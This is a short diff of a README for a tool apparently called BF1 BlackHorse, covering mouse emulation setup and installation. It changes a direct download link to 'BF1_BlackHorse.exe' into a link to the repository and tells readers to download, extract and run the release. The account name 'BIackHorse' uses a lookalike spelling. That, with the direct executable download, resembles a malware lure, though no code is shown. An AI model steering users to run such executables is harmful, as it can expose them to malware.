@@ -37,7 +37,7 @@ Follow these steps for mouse emulation setup:
 
 ## :hammer_and_wrench: Installation Steps
 1. **Download:**
-   - Obtain the latest release from the [Releases section](https://github.com/BIackHorse/BF1/blob/main/BF1_BlackHorse.exe).
+   - Obtain the latest release from the [Releases section](https://github.com/BIackHorse/BF1).
 2. **Extract:**
    - Unzip the file to a desired location.
 3. **Run:**
